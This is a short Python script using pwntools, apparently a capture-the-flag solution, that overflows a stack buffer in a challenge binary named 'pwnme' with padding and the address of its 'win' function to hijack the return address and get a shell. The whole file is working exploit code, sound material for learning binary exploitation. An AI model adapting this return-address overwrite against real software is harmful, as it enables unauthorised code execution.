#!/usr/bin/env python3

# Overwrite the stack frame return address with the win function address.
# The data was aligned a bit weirdly in BinaryNinja

# Not exactly sure the exact offset of the return address, so I spam the
# win function address at the end of the stack frame.  Alignment was
# important though

from pwn import *

print("Start pwning")

e = ELF("./pwnme")
winAddr = e.symbols['win']

sh = process("./pwnme")
#sh = remote("0.cloud.chals.io",22209)

payload = b'A' * 0x43
payload += p32(winAddr)
payload += b"\n"

print("Payload:")
print(payload)

sh.send(payload)

# Cat the flag when you get shell
sh.interactive()


